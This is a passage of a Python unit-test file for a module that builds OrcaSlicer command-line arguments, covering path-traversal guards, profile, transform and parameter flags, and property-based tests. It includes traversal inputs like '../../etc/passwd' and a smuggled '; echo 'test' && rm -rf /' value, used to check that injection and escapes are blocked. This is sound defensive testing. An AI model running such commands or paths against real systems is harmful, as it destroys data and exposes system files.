"""
Unit tests for CLI builder module.

Tests verify that CLI arguments are constructed safely and correctly,
with proper path validation and security guards.

Requirements: 4.1, 11.1, 11.3
"""

import os
from pathlib import Path
from typing import Any

import pytest
from hypothesis import given, settings, strategies as st

from app.cli_builder import build_cli_args, resolve_and_guard


class TestResolveAndGuard:
    """Test path resolution and traversal protection."""

    def test_resolve_valid_relative_path(self, tmp_path):
        """Valid relative paths should resolve within root."""
        root = tmp_path / "workspace"
        root.mkdir()
        
        result = resolve_and_guard(Path("session/file.stl"), root)
        
        assert result == root / "session" / "file.stl"
        assert str(result).startswith(str(root))

    def test_resolve_valid_nested_path(self, tmp_path):
        """Nested relative paths should resolve correctly."""
        root = tmp_path / "workspace"
        root.mkdir()
        
        result = resolve_and_guard(Path("sessions/abc123/uploads/model.stl"), root)
        
        assert result == root / "sessions" / "abc123" / "uploads" / "model.stl"

    def test_reject_parent_traversal(self, tmp_path):
        """Paths with .. that escape root should be rejected."""
        root = tmp_path / "workspace"
        root.mkdir()
        
        with pytest.raises(ValueError, match="Path traversal detected"):
            resolve_and_guard(Path("../../etc/passwd"), root)

    def test_reject_absolute_path_outside_root(self, tmp_path):
        """Absolute paths outside root should be rejected."""
        root = tmp_path / "workspace"
        root.mkdir()
        
        with pytest.raises(ValueError, match="Path traversal detected"):
            resolve_and_guard(Path("/etc/passwd"), root)

    def test_reject_symlink_escape(self, tmp_path):
        """Symlinks that point outside root should be rejected."""
        root = tmp_path / "workspace"
        root.mkdir()
        
        # Create a symlink inside root that points outside
        link_path = root / "evil_link"
        target = tmp_path / "outside"
        target.mkdir()
        link_path.symlink_to(target)
        
        with pytest.raises(ValueError, match="Path traversal detected"):
            resolve_and_guard(Path("evil_link"), root)

    def test_accept_path_with_similar_prefix(self, tmp_path):
        """Paths in directories with similar names should work correctly."""
        # Test case: /app/workspace vs /app/workspace-other
        root = tmp_path / "workspace"
        root.mkdir()
        other_root = tmp_path / "workspace-other"
        other_root.mkdir()
        
        # This should work fine within workspace
        result = resolve_and_guard(Path("file.stl"), root)
        assert str(result).startswith(str(root))
        
        # This should fail because it's in workspace-other, not workspace
        with pytest.raises(ValueError, match="Path traversal detected"):
            resolve_and_guard(other_root / "file.stl", root)

    def test_root_itself_is_valid(self, tmp_path):
        """The root directory itself should be a valid path."""
        root = tmp_path / "workspace"
        root.mkdir()
        
        result = resolve_and_guard(Path("."), root)
        assert result == root


class MockConfig:
    """Mock configuration object for testing."""
    
    def __init__(self, tmp_path: Path):
        self.orca_cli_path = Path("/usr/bin/orca-slicer")
        self.tmp_root = tmp_path / "tmp"
        self.tmp_root.mkdir(exist_ok=True)
        self.profiles_root = tmp_path / "profiles"
        self.profiles_root.mkdir(exist_ok=True)


class TestBuildCliArgsBasic:
    """Test basic CLI argument construction."""

    def test_minimal_job_request(self, tmp_path):
        """Minimal job with only required fields should produce valid args."""
        config = MockConfig(tmp_path)
        session_dir = config.tmp_root / "sessions" / "session123"
        session_dir.mkdir(parents=True)
        output_dir = config.tmp_root / "jobs" / "job456" / "output"
        output_dir.mkdir(parents=True)
        
        # Create a mock uploaded file (real uploads live under uploads/, not
        # session_dir directly — see files.py's storage_path convention)
        file_id = "file123"
        stored_path = session_dir / "uploads" / f"{file_id}.stl"
        stored_path.parent.mkdir(parents=True, exist_ok=True)
        stored_path.touch()
        
        job = {
            "file_ids": [file_id],
            "action": "slice",
        }
        
        args = build_cli_args(job, config, {file_id: stored_path}, output_dir)
        
        # Should contain: CLI path, input file, action, outputdir
        assert args[0] == str(config.orca_cli_path)
        assert str(stored_path) in args
        assert "--slice" in args
        assert "0" in args  # default plate number
        assert "--outputdir" in args
        assert str(output_dir) in args

    def test_multiple_input_files(self, tmp_path):
        """Job with multiple input files should include all files."""
        config = MockConfig(tmp_path)
        session_dir = config.tmp_root / "sessions" / "session123"
        session_dir.mkdir(parents=True)
        output_dir = config.tmp_root / "jobs" / "job456" / "output"
        output_dir.mkdir(parents=True)
        
        # Create multiple files
        file_ids = ["file1", "file2", "file3"]
        extensions = ["stl", "stl", "obj"]
        file_paths = {}
        for fid, ext in zip(file_ids, extensions):
            stored_path = session_dir / "uploads" / f"{fid}.{ext}"
            stored_path.parent.mkdir(parents=True, exist_ok=True)
            stored_path.touch()
            file_paths[fid] = stored_path
        
        job = {
            "file_ids": file_ids,
            "action": "export_3mf",
        }
        
        args = build_cli_args(job, config, file_paths, output_dir)
        
        # All files should be in args
        for fid in file_ids:
            assert str(file_paths[fid]) in args


class TestBuildCliArgsActions:
    """Test different action types."""

    def test_slice_action_with_plate(self, tmp_path):
        """Slice action with specific plate number."""
        config = MockConfig(tmp_path)
        session_dir = config.tmp_root / "sessions" / "s1"
        session_dir.mkdir(parents=True)
        output_dir = config.tmp_root / "jobs" / "j1" / "output"
        output_dir.mkdir(parents=True)
        
        job = {
            "file_ids": [],
            "action": "slice",
            "plate_number": 3,
        }
        
        args = build_cli_args(job, config, {}, output_dir)
        
        assert "--slice" in args
        slice_idx = args.index("--slice")
        assert args[slice_idx + 1] == "3"

    def test_export_3mf_action(self, tmp_path):
        """Export 3MF action should use correct flag."""
        config = MockConfig(tmp_path)
        session_dir = config.tmp_root / "sessions" / "s1"
        session_dir.mkdir(parents=True)
        output_dir = config.tmp_root / "jobs" / "j1" / "output"
        output_dir.mkdir(parents=True)
        
        job = {
            "file_ids": [],
            "action": "export_3mf",
        }
        
        args = build_cli_args(job, config, {}, output_dir)
        assert "--export-3mf" in args

    def test_export_settings_action(self, tmp_path):
        """Export settings action should use correct flag."""
        config = MockConfig(tmp_path)
        session_dir = config.tmp_root / "sessions" / "s1"
        session_dir.mkdir(parents=True)
        output_dir = config.tmp_root / "jobs" / "j1" / "output"
        output_dir.mkdir(parents=True)
        
        job = {
            "file_ids": [],
            "action": "export_settings",
        }
        
        args = build_cli_args(job, config, {}, output_dir)
        assert "--export-settings" in args


class TestBuildCliArgsProfiles:
    """Test profile path handling."""

    def test_printer_profile(self, tmp_path):
        """Printer profile should appear with --load_settings."""
        config = MockConfig(tmp_path)
        session_dir = config.tmp_root / "sessions" / "s1"
        session_dir.mkdir(parents=True)
        output_dir = config.tmp_root / "jobs" / "j1" / "output"
        output_dir.mkdir(parents=True)
        
        # Create profile file
        printer_profile = config.profiles_root / "manufacturer" / "printer.json"
        printer_profile.parent.mkdir(parents=True)
        printer_profile.touch()
        
        job = {
            "file_ids": [],
            "action": "slice",
            "printer_profile_path": "manufacturer/printer.json",
        }
        
        args = build_cli_args(job, config, {}, output_dir)
        
        # The real OrcaSlicer CLI takes ONE --load-settings flag with a
        # semicolon-separated file list (`--load-settings
        # "setting1.json;setting2.json"`), not repeated flags.
        assert "--load-settings" in args
        settings_idx = args.index("--load-settings")
        assert args[settings_idx + 1] == str(printer_profile)

    def test_process_profile(self, tmp_path):
        """Process profile should appear with --load-settings."""
        config = MockConfig(tmp_path)
        session_dir = config.tmp_root / "sessions" / "s1"
        session_dir.mkdir(parents=True)
        output_dir = config.tmp_root / "jobs" / "j1" / "output"
        output_dir.mkdir(parents=True)
        
        # Create profile file
        process_profile = config.profiles_root / "manufacturer" / "process.json"
        process_profile.parent.mkdir(parents=True)
        process_profile.touch()
        
        job = {
            "file_ids": [],
            "action": "slice",
            "process_profile_path": "manufacturer/process.json",
        }
        
        args = build_cli_args(job, config, {}, output_dir)
        
        assert "--load-settings" in args
        # Should have process profile path
        settings_idx = args.index("--load-settings")
        assert str(process_profile) in args[settings_idx + 1]

    def test_multiple_filament_profiles(self, tmp_path):
        """Multiple filament profiles should appear as ONE --load-filaments
        flag with a semicolon-separated file list."""
        config = MockConfig(tmp_path)
        session_dir = config.tmp_root / "sessions" / "s1"
        session_dir.mkdir(parents=True)
        output_dir = config.tmp_root / "jobs" / "j1" / "output"
        output_dir.mkdir(parents=True)
        
        # Create profile files
        filaments = ["filament1.json", "filament2.json"]
        for fname in filaments:
            fpath = config.profiles_root / "manufacturer" / fname
            fpath.parent.mkdir(parents=True, exist_ok=True)
            fpath.touch()
        
        job = {
            "file_ids": [],
            "action": "slice",
            "filament_profile_paths": [f"manufacturer/{f}" for f in filaments],
        }
        
        args = build_cli_args(job, config, {}, output_dir)
        
        # Should have exactly ONE --load-filaments flag, with both paths
        # semicolon-joined in its value.
        filament_count = args.count("--load-filaments")
        assert filament_count == 1
        filaments_idx = args.index("--load-filaments")
        value = args[filaments_idx + 1]
        assert value.count(";") == 1
        for fname in filaments:
            assert fname in value

    def test_profile_path_traversal_rejected(self, tmp_path):
        """Profile paths with traversal attempts should be rejected."""
        config = MockConfig(tmp_path)
        session_dir = config.tmp_root / "sessions" / "s1"
        session_dir.mkdir(parents=True)
        output_dir = config.tmp_root / "jobs" / "j1" / "output"
        output_dir.mkdir(parents=True)
        
        job = {
            "file_ids": [],
            "action": "slice",
            "printer_profile_path": "../../etc/passwd",
        }
        
        with pytest.raises(ValueError, match="Path traversal detected"):
            build_cli_args(job, config, {}, output_dir)


class TestBuildCliArgsParameterOverrides:
    """Test parameter override handling."""

    def test_parameter_overrides_format(self, tmp_path):
        """Parameter overrides should appear as --key-with-dashes=value —
        OrcaSlicer's CLI (`ConfigOptionDef::cli_args`,
        libslic3r/Config.cpp:238-254) derives every option's CLI flag name
        from its key with underscores replaced by dashes; passing the raw
        underscored key is rejected outright as an unrecognized option."""
        config = MockConfig(tmp_path)
        session_dir = config.tmp_root / "sessions" / "s1"
        session_dir.mkdir(parents=True)
        output_dir = config.tmp_root / "jobs" / "j1" / "output"
        output_dir.mkdir(parents=True)
        
        job = {
            "file_ids": [],
            "action": "slice",
            "parameter_overrides": {
                "layer_height": "0.2",
                "infill_density": "20",
                "support_enable": "true",
            }
        }
        
        args = build_cli_args(job, config, {}, output_dir)
        
        assert "--layer-height=0.2" in args
        assert "--infill-density=20" in args
        assert "--support-enable=true" in args
        # The old (buggy) underscored form must never appear.
        assert "--layer_height=0.2" not in args
        assert "--infill_density=20" not in args
        assert "--support_enable=true" not in args

    def test_numeric_parameter_values(self, tmp_path):
        """Numeric parameter values should be properly formatted."""
        config = MockConfig(tmp_path)
        session_dir = config.tmp_root / "sessions" / "s1"
        session_dir.mkdir(parents=True)
        output_dir = config.tmp_root / "jobs" / "j1" / "output"
        output_dir.mkdir(parents=True)
        
        job = {
            "file_ids": [],
            "action": "slice",
            "parameter_overrides": {
                "temperature": 220,
                "speed": 50.5,
                "enabled": True,
            }
        }
        
        args = build_cli_args(job, config, {}, output_dir)
        
        assert "--temperature=220" in args
        assert "--speed=50.5" in args
        assert "--enabled=True" in args

    def test_multi_word_key_dash_conversion_regression(self, tmp_path):
        """Regression test for the bed-temperature bug: a multi-underscore
        key like curr_bed_type must become --curr-bed-type=..., not
        --curr_bed_type=... (which OrcaSlicer's CLI parser rejects with
        "Invalid option", silently failing the whole job and making the
        override have no effect at all — e.g. selecting "Textured Cool
        Plate" in the UI never actually changed the sliced bed
        temperature, since curr_bed_type never reached the CLI)."""
        config = MockConfig(tmp_path)
        session_dir = config.tmp_root / "sessions" / "s1"
        session_dir.mkdir(parents=True)
        output_dir = config.tmp_root / "jobs" / "j1" / "output"
        output_dir.mkdir(parents=True)

        job = {
            "file_ids": [],
            "action": "slice",
            "parameter_overrides": {
                "curr_bed_type": "Textured Cool Plate",
            },
        }

        args = build_cli_args(job, config, {}, output_dir)

        assert "--curr-bed-type=Textured Cool Plate" in args
        assert not any(a.startswith("--curr_bed_type") for a in args)


class TestBuildCliArgsTransforms:
    """Test transform option handling."""

    def test_numeric_transforms(self, tmp_path):
        """Numeric transforms should appear as --flag=value."""
        config = MockConfig(tmp_path)
        session_dir = config.tmp_root / "sessions" / "s1"
        session_dir.mkdir(parents=True)
        output_dir = config.tmp_root / "jobs" / "j1" / "output"
        output_dir.mkdir(parents=True)
        
        job = {
            "file_ids": [],
            "action": "slice",
            "transforms": {
                "rotate": 45,
                "rotate_x": 90,
                "rotate_y": 180,
                "scale": 1.5,
            }
        }
        
        args = build_cli_args(job, config, {}, output_dir)
        
        assert "--rotate=45" in args
        assert "--rotate-x=90" in args
        assert "--rotate-y=180" in args
        assert "--scale=1.5" in args

    def test_boolean_transforms(self, tmp_path):
        """Boolean transforms should appear as flags when true."""
        config = MockConfig(tmp_path)
        session_dir = config.tmp_root / "sessions" / "s1"
        session_dir.mkdir(parents=True)
        output_dir = config.tmp_root / "jobs" / "j1" / "output"
        output_dir.mkdir(parents=True)
        
        job = {
            "file_ids": [],
            "action": "slice",
            "transforms": {
                "ensure_on_bed": True,
                "assemble": True,
                "convert_unit": False,
            }
        }
        
        args = build_cli_args(job, config, {}, output_dir)
        
        assert "--ensure-on-bed" in args
        assert "--assemble" in args
        assert "--convert-unit" not in args  # False should not appear

    def test_arrange_with_suboptions(self, tmp_path):
        """Arrange=1 or 2 should enable sub-options."""
        config = MockConfig(tmp_path)
        session_dir = config.tmp_root / "sessions" / "s1"
        session_dir.mkdir(parents=True)
        output_dir = config.tmp_root / "jobs" / "j1" / "output"
        output_dir.mkdir(parents=True)
        
        job = {
            "file_ids": [],
            "action": "slice",
            "transforms": {
                "arrange": 2,
                "allow_rotations": True,
                "allow_multicolor_oneplate": True,
            }
        }
        
        args = build_cli_args(job, config, {}, output_dir)
        
        assert "--arrange=2" in args
        assert "--allow-rotations" in args
        assert "--allow-multicolor-oneplate" in args

    def test_arrange_zero_no_suboptions(self, tmp_path):
        """Arrange=0 should not enable sub-options even if they're set."""
        config = MockConfig(tmp_path)
        session_dir = config.tmp_root / "sessions" / "s1"
        session_dir.mkdir(parents=True)
        output_dir = config.tmp_root / "jobs" / "j1" / "output"
        output_dir.mkdir(parents=True)
        
        job = {
            "file_ids": [],
            "action": "slice",
            "transforms": {
                "arrange": 0,
                "allow_rotations": True,  # Should be ignored
            }
        }
        
        args = build_cli_args(job, config, {}, output_dir)
        
        assert "--arrange=0" in args
        assert "--allow-rotations" not in args


class TestBuildCliArgsTransformsPropertyBased:
    """Property-based tests for transform options using Hypothesis."""

    @settings(max_examples=100)
    @given(
        rotate=st.one_of(st.none(), st.floats(min_value=-360, max_value=360, allow_nan=False, allow_infinity=False)),
        rotate_x=st.one_of(st.none(), st.floats(min_value=-360, max_value=360, allow_nan=False, allow_infinity=False)),
        rotate_y=st.one_of(st.none(), st.floats(min_value=-360, max_value=360, allow_nan=False, allow_infinity=False)),
        scale=st.one_of(st.none(), st.floats(min_value=0.01, max_value=100, allow_nan=False, allow_infinity=False)),
        arrange=st.one_of(st.none(), st.sampled_from([0, 1, 2])),
        orient=st.one_of(st.none(), st.sampled_from([0, 1, 2])),
        repetitions=st.one_of(st.none(), st.integers(min_value=1, max_value=100)),
        ensure_on_bed=st.booleans(),
        assemble=st.booleans(),
        convert_unit=st.booleans(),
        allow_rotations=st.booleans(),
        allow_multicolor_oneplate=st.booleans(),
        avoid_extrusion_cali_region=st.booleans(),
    )
    def test_property_transform_options_produce_correct_flags(
        self, rotate, rotate_x, rotate_y, scale, arrange, orient, 
        repetitions, ensure_on_bed, assemble, convert_unit, 
        allow_rotations, allow_multicolor_oneplate, avoid_extrusion_cali_region
    ):
        """
        Property 8: Transform options appear as correct CLI flags.
        
        For any set of transform options where a field is non-null/non-default,
        the constructed CLI args list shall contain the corresponding CLI flag.
        For flag-valued options (ensure_on_bed, assemble, convert_unit), the flag
        shall be present if and only if the option is true.
        
        **Validates: Requirements 4.2, 4.4**
        """
        import tempfile
        
        with tempfile.TemporaryDirectory() as tmp_dir:
            tmp_path = Path(tmp_dir)
            config = MockConfig(tmp_path)
            session_dir = config.tmp_root / "sessions" / "s1"
            session_dir.mkdir(parents=True)
            output_dir = config.tmp_root / "jobs" / "j1" / "output"
            output_dir.mkdir(parents=True)
            
            # Build transform options dict with only non-None values
            transforms = {}
            if rotate is not None:
                transforms["rotate"] = rotate
            if rotate_x is not None:
                transforms["rotate_x"] = rotate_x
            if rotate_y is not None:
                transforms["rotate_y"] = rotate_y
            if scale is not None:
                transforms["scale"] = scale
            if arrange is not None:
                transforms["arrange"] = arrange
            if orient is not None:
                transforms["orient"] = orient
            if repetitions is not None:
                transforms["repetitions"] = repetitions
            
            # Boolean transforms
            transforms["ensure_on_bed"] = ensure_on_bed
            transforms["assemble"] = assemble
            transforms["convert_unit"] = convert_unit
            
            # Arrange sub-options
            transforms["allow_rotations"] = allow_rotations
            transforms["allow_multicolor_oneplate"] = allow_multicolor_oneplate
            transforms["avoid_extrusion_cali_region"] = avoid_extrusion_cali_region
            
            job = {
                "file_ids": [],
                "action": "slice",
                "transforms": transforms,
            }
            
            args = build_cli_args(job, config, {}, output_dir)
            args_str = " ".join(args)  # For easier searching
            
            # Verify numeric/enum transforms with values. --rotate/--rotate-x/
            # --rotate-y are deliberately skipped when their value is exactly
            # 0 (see cli_builder.py's ZERO_SKIPPABLE_ROTATION_KEYS comment —
            # this real OrcaSlicer CLI build segfaults on these flags
            # regardless of value, so 0 — a no-op rotation anyway — is
            # omitted to avoid the crash for the common default case).
            if rotate is not None and rotate != 0:
                assert f"--rotate={rotate}" in args, f"Expected --rotate={rotate} in args"
            else:
                assert "--rotate=" not in args_str, "rotate should not appear when None or 0"
            
            if rotate_x is not None and rotate_x != 0:
                assert f"--rotate-x={rotate_x}" in args, f"Expected --rotate-x={rotate_x} in args"
            else:
                assert "--rotate-x=" not in args_str, "rotate_x should not appear when None or 0"
            
            if rotate_y is not None and rotate_y != 0:
                assert f"--rotate-y={rotate_y}" in args, f"Expected --rotate-y={rotate_y} in args"
            else:
                assert "--rotate-y=" not in args_str, "rotate_y should not appear when None or 0"
            
            if scale is not None:
                assert f"--scale={scale}" in args, f"Expected --scale={scale} in args"
            else:
                assert "--scale=" not in args_str, "scale should not appear when None"
            
            if arrange is not None:
                assert f"--arrange={arrange}" in args, f"Expected --arrange={arrange} in args"
            else:
                assert "--arrange=" not in args_str, "arrange should not appear when None"
            
            if orient is not None:
                assert f"--orient={orient}" in args, f"Expected --orient={orient} in args"
            else:
                assert "--orient=" not in args_str, "orient should not appear when None"
            
            if repetitions is not None:
                assert f"--repetitions={repetitions}" in args, f"Expected --repetitions={repetitions} in args"
            else:
                assert "--repetitions=" not in args_str, "repetitions should not appear when None"
            
            # Verify boolean transforms (flag present if and only if True)
            if ensure_on_bed:
                assert "--ensure-on-bed" in args, "ensure_on_bed flag should be present when True"
            else:
                assert "--ensure-on-bed" not in args, "ensure_on_bed flag should not be present when False"
            
            if assemble:
                assert "--assemble" in args, "assemble flag should be present when True"
            else:
                assert "--assemble" not in args, "assemble flag should not be present when False"
            
            if convert_unit:
                assert "--convert-unit" in args, "convert_unit flag should be present when True"
            else:
                assert "--convert-unit" not in args, "convert_unit flag should not be present when False"
            
            # Verify arrange sub-options (only appear when arrange is 1 or 2)
            if arrange in (1, 2):
                if allow_rotations:
                    assert "--allow-rotations" in args, "allow_rotations should be present when arrange=1/2 and True"
                else:
                    assert "--allow-rotations" not in args, "allow_rotations should not be present when False"
                
                if allow_multicolor_oneplate:
                    assert "--allow-multicolor-oneplate" in args, "allow_multicolor_oneplate should be present when arrange=1/2 and True"
                else:
                    assert "--allow-multicolor-oneplate" not in args, "allow_multicolor_oneplate should not be present when False"
                
                if avoid_extrusion_cali_region:
                    assert "--avoid-extrusion-cali-region" in args, "avoid_extrusion_cali_region should be present when arrange=1/2 and True"
                else:
                    assert "--avoid-extrusion-cali-region" not in args, "avoid_extrusion_cali_region should not be present when False"
            else:
                # When arrange is 0 or None, sub-options should not appear even if True
                assert "--allow-rotations" not in args, "allow_rotations should not appear when arrange != 1/2"
                assert "--allow-multicolor-oneplate" not in args, "allow_multicolor_oneplate should not appear when arrange != 1/2"
                assert "--avoid-extrusion-cali-region" not in args, "avoid_extrusion_cali_region should not appear when arrange != 1/2"


class TestBuildCliArgsMisc:
    """Test misc options handling."""

    def test_datadir_option(self, tmp_path):
        """Datadir option should appear with path."""
        config = MockConfig(tmp_path)
        session_dir = config.tmp_root / "sessions" / "s1"
        session_dir.mkdir(parents=True)
        output_dir = config.tmp_root / "jobs" / "j1" / "output"
        output_dir.mkdir(parents=True)
        
        job = {
            "file_ids": [],
            "action": "slice",
            "misc": {
                "datadir": "/custom/data/dir",
            }
        }
        
        args = build_cli_args(job, config, {}, output_dir)
        
        assert "--datadir" in args
        datadir_idx = args.index("--datadir")
        assert args[datadir_idx + 1] == "/custom/data/dir"

    def test_debug_level(self, tmp_path):
        """Debug level should appear as integer."""
        config = MockConfig(tmp_path)
        session_dir = config.tmp_root / "sessions" / "s1"
        session_dir.mkdir(parents=True)
        output_dir = config.tmp_root / "jobs" / "j1" / "output"
        output_dir.mkdir(parents=True)
        
        job = {
            "file_ids": [],
            "action": "slice",
            "misc": {
                "debug": 3,
            }
        }
        
        args = build_cli_args(job, config, {}, output_dir)
        
        assert "--debug" in args
        debug_idx = args.index("--debug")
        assert args[debug_idx + 1] == "3"

    def test_custom_gcodes_file(self, tmp_path):
        """Custom gcode file should be validated and included."""
        config = MockConfig(tmp_path)
        session_dir = config.tmp_root / "sessions" / "s1"
        session_dir.mkdir(parents=True)
        output_dir = config.tmp_root / "jobs" / "j1" / "output"
        output_dir.mkdir(parents=True)
        
        # Create custom gcode file
        gcode_file = session_dir / "uploads" / "custom_gcode_id.json"
        gcode_file.parent.mkdir(parents=True, exist_ok=True)
        gcode_file.touch()
        
        job = {
            "file_ids": [],
            "action": "slice",
            "misc": {
                "load_custom_gcodes_file_id": "custom_gcode_id",
            }
        }
        
        args = build_cli_args(job, config, {"custom_gcode_id": gcode_file}, output_dir)
        
        assert "--load-custom-gcodes" in args
        assert str(gcode_file) in args

    def test_integer_list_options(self, tmp_path):
        """Integer list options should be comma-separated."""
        config = MockConfig(tmp_path)
        session_dir = config.tmp_root / "sessions" / "s1"
        session_dir.mkdir(parents=True)
        output_dir = config.tmp_root / "jobs" / "j1" / "output"
        output_dir.mkdir(parents=True)
        
        job = {
            "file_ids": [],
            "action": "slice",
            "misc": {
                "load_filament_ids": [1, 2, 3],
                "skip_objects": [5, 10],
                "clone_objects": [7],
            }
        }
        
        args = build_cli_args(job, config, {}, output_dir)
        
        assert "--load-filament-ids" in args
        fid_idx = args.index("--load-filament-ids")
        assert args[fid_idx + 1] == "1,2,3"
        
        assert "--skip-objects" in args
        skip_idx = args.index("--skip-objects")
        assert args[skip_idx + 1] == "5,10"
        
        assert "--clone-objects" in args
        clone_idx = args.index("--clone-objects")
        assert args[clone_idx + 1] == "7"

    def test_boolean_misc_options(self, tmp_path):
        """Boolean misc options should appear as flags."""
        config = MockConfig(tmp_path)
        session_dir = config.tmp_root / "sessions" / "s1"
        session_dir.mkdir(parents=True)
        output_dir = config.tmp_root / "jobs" / "j1" / "output"
        output_dir.mkdir(parents=True)
        
        job = {
            "file_ids": [],
            "action": "slice",
            "misc": {
                "allow_newer_file": True,
                "skip_modified_gcodes": True,
                "downward_check": False,
            }
        }
        
        args = build_cli_args(job, config, {}, output_dir)
        
        assert "--allow-newer-file" in args
        assert "--skip-modified-gcodes" in args
        assert "--downward-check" not in args  # False should not appear


class TestBuildCliArgsActionFlags:
    """Test action flags handling."""

    def test_action_flags(self, tmp_path):
        """Action flags should appear when set to true."""
        config = MockConfig(tmp_path)
        session_dir = config.tmp_root / "sessions" / "s1"
        session_dir.mkdir(parents=True)
        output_dir = config.tmp_root / "jobs" / "j1" / "output"
        output_dir.mkdir(parents=True)
        
        job = {
            "file_ids": [],
            "action": "slice",
            "action_flags": {
                "min_save": True,
                "normative_check": True,
                "uptodate": False,
            }
        }
        
        args = build_cli_args(job, config, {}, output_dir)
        
        assert "--min-save" in args
        assert "--normative-check" in args
        assert "--uptodate" not in args


class TestBuildCliArgsActionsPropertyBased:
    """Property-based tests for action selection using Hypothesis."""

    @settings(max_examples=100)
    @given(
        action=st.sampled_from(["slice", "export_3mf", "export_stl", "export_stls", "export_settings"]),
        plate_number=st.one_of(st.none(), st.integers(min_value=0, max_value=10)),
        has_profiles=st.booleans(),
        has_transforms=st.booleans(),
        has_parameters=st.booleans(),
    )
    def test_property_9_exactly_one_action_flag(
        self, action, plate_number, has_profiles, has_transforms, has_parameters
    ):
        """
        Property 9: Exactly one action flag per CLI invocation.
        
        For any valid job request, the constructed CLI args list shall contain 
        exactly one string from the set {"--slice", "--export-3mf", "--export-stl", 
        "--export-stls", "--export-settings"}.
        
        This test generates jobs with various combinations of optional parameters
        to ensure that regardless of what else is in the job, exactly one action
        flag always appears.
        
        **Validates: Requirements 5.5**
        """
        import tempfile
        
        with tempfile.TemporaryDirectory() as tmp_dir:
            tmp_path = Path(tmp_dir)
            config = MockConfig(tmp_path)
            session_dir = config.tmp_root / "sessions" / "s1"
            session_dir.mkdir(parents=True)
            output_dir = config.tmp_root / "jobs" / "j1" / "output"
            output_dir.mkdir(parents=True)
            
            # Build a job with the given action
            job = {
                "file_ids": [],
                "action": action,
            }
            
            # Add plate_number for slice action if needed
            if action == "slice" and plate_number is not None:
                job["plate_number"] = plate_number
            
            # Optionally add profiles to make the job more realistic
            if has_profiles:
                # Create mock profile files
                printer_profile = config.profiles_root / "test" / "printer.json"
                printer_profile.parent.mkdir(parents=True, exist_ok=True)
                printer_profile.touch()
                job["printer_profile_path"] = "test/printer.json"
            
            # Optionally add transforms
            if has_transforms:
                job["transforms"] = {
                    "rotate": 45,
                    "scale": 1.5,
                }
            
            # Optionally add parameter overrides
            if has_parameters:
                job["parameter_overrides"] = {
                    "layer_height": "0.2",
                    "infill_density": "20",
                }
            
            # Build CLI args
            args = build_cli_args(job, config, {}, output_dir)
            
            # Define all possible action flags (hyphenated — matching the
            # real OrcaSlicer CLI's `--export-3mf`/`--export-stl`/etc.)
            ACTION_FLAGS = {
                "--slice",
                "--export-3mf",
                "--export-stl",
                "--export-stls",
                "--export-settings"
            }
            
            # Count how many action flags appear in the args
            action_flags_found = [flag for flag in args if flag in ACTION_FLAGS]
            
            # Assert exactly one action flag is present
            assert len(action_flags_found) == 1, (
                f"Expected exactly 1 action flag in CLI args, but found {len(action_flags_found)}: "
                f"{action_flags_found}. Full args: {args}"
            )
            
            # Assert the correct action flag for the requested action
            expected_flag = f"--{action.replace('_', '-')}"
            assert expected_flag in args, (
                f"Expected action flag {expected_flag} for action {action!r} to be in args, "
                f"but it was not found. Args: {args}"
            )


class TestBuildCliArgsComplexScenarios:
    """Test complex real-world scenarios."""

    def test_full_job_with_all_options(self, tmp_path):
        """Complete job with all option types should produce valid args."""
        config = MockConfig(tmp_path)
        session_dir = config.tmp_root / "sessions" / "s1"
        session_dir.mkdir(parents=True)
        output_dir = config.tmp_root / "jobs" / "j1" / "output"
        output_dir.mkdir(parents=True)
        
        # Create files
        file_id = "model"
        stored_path = session_dir / "uploads" / f"{file_id}.stl"
        stored_path.parent.mkdir(parents=True, exist_ok=True)
        stored_path.touch()
        
        printer_profile = config.profiles_root / "bambu" / "x1c.json"
        printer_profile.parent.mkdir(parents=True)
        printer_profile.touch()
        
        job = {
            "file_ids": [file_id],
            "action": "slice",
            "plate_number": 1,
            "printer_profile_path": "bambu/x1c.json",
            "parameter_overrides": {
                "layer_height": "0.2",
            },
            "transforms": {
                "rotate": 90,
                "scale": 1.0,
            },
            "misc": {
                "debug": 1,
            },
        }
        
        args = build_cli_args(job, config, {file_id: stored_path}, output_dir)
        
        # Verify it's a list of strings (no shell required)
        assert isinstance(args, list)
        assert all(isinstance(arg, str) for arg in args)
        
        # Verify key components present
        assert args[0] == str(config.orca_cli_path)
        assert "--slice" in args
        assert "--load-settings" in args
        assert "--outputdir" in args
        assert "--layer-height=0.2" in args
        assert "--rotate=90" in args
        assert "--debug" in args

    def test_shell_metacharacters_are_safe(self, tmp_path):
        """Shell metacharacters in values should not break argument list."""
        config = MockConfig(tmp_path)
        session_dir = config.tmp_root / "sessions" / "s1"
        session_dir.mkdir(parents=True)
        output_dir = config.tmp_root / "jobs" / "j1" / "output"
        output_dir.mkdir(parents=True)
        
        # Parameter value contains shell metacharacters
        job = {
            "file_ids": [],
            "action": "slice",
            "parameter_overrides": {
                "custom_gcode": "; echo 'test' && rm -rf /",
            },
        }
        
        args = build_cli_args(job, config, {}, output_dir)
        
        # The metacharacters should be in a single argument, not parsed
        assert "--custom-gcode=; echo 'test' && rm -rf /" in args
        
        # Verify args is still a proper list
        assert isinstance(args, list)

    def test_empty_options_sections_ignored(self, tmp_path):
        """Empty option dictionaries should not affect output."""
        config = MockConfig(tmp_path)
        session_dir = config.tmp_root / "sessions" / "s1"
        session_dir.mkdir(parents=True)
        output_dir = config.tmp_root / "jobs" / "j1" / "output"
        output_dir.mkdir(parents=True)
        
        job = {
            "file_ids": [],
            "action": "slice",
            "parameter_overrides": {},
            "transforms": {},
            "misc": {},
            "action_flags": {},
        }
        
        args = build_cli_args(job, config, {}, output_dir)
        
        # Should only have: cli_path, action, outputdir
        assert args[0] == str(config.orca_cli_path)
        assert "--slice" in args
        assert "--outputdir" in args


# ============================================================================
# PROPERTY-BASED TESTS
# ============================================================================

from hypothesis import given, settings, strategies as st, HealthCheck
from datetime import timedelta
import tempfile


class TestProfileFlagsPropertyTests:
    """
    Property-based tests for profile flags in CLI arguments.
    
    Property 4: Profile paths appear as correct CLI flags
    
    For any valid job request containing a printer profile path P, a process
    profile path Q, and filament profile paths F₁…Fₙ, the constructed CLI args
    list shall contain `--load_settings` followed by the resolved absolute path
    of P, `--load_settings` followed by the resolved absolute path of Q, and
    one `--load_filaments` followed by each resolved filament path.
    
    Validates: Requirements 2.4
    """

    @settings(
        max_examples=100,
        deadline=timedelta(seconds=5),
        suppress_health_check=[HealthCheck.function_scoped_fixture]
    )
    @given(
        printer_profile_name=st.text(
            min_size=1,
            max_size=30,
            alphabet=st.characters(
                whitelist_categories=('Lu', 'Ll', 'Nd'),
